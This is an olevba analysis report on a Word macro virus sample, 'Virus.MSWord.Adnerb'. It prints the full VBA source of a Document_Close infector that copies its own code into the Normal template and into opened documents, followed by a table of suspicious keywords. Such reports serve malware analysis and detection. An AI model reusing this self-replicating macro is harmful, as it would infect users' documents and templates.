olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Adnerb-44079773383c2033d23339d4abd9d4f279df4247
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ¯f¬r´ú¸Õ.cls 
in file: Virus.MSWord.Adnerb-44079773383c2033d23339d4abd9d4f279df4247 - OLE stream: 'Macros/VBA/¯f¬r´ú¸Õ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Set Ns = NormalTemplate.VBProject.VBComponents.Item(1)
Set Ds = ActiveDocument.VBProject.VBComponents.Item(1)
Na = Ns.CodeModule.CountOfLines
Da = Ds.CodeModule.CountOfLines
k = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ReDim kk(k)
For i = 1 To k
   kk(i) = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Next i
If Na = 0 Then
    Ns.CodeModule.AddFromString "Private Sub Document_Close()"
    For i = 2 To k
        Ns.CodeModule.InsertLines i, kk(i)
    Next i
    Ns.Name = "¯f¬r´ú¸Õ"
End If
If Da = 0 Then
    Ds.CodeModule.AddFromString "Private Sub Document_Open()"
    For i = 2 To k
        Ds.CodeModule.InsertLines i, kk(i)
    Next i
End If
If Second(Now) Mod 10 > 5 Then MsgBox "°ê¨¾³¡³q¸ê§½³q¸ê¦w¥þ³B" & Chr(10) & Chr(13) & Chr(10) & Chr(13) & "¯f¬r·P¬V¸ÕÅç¡I"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

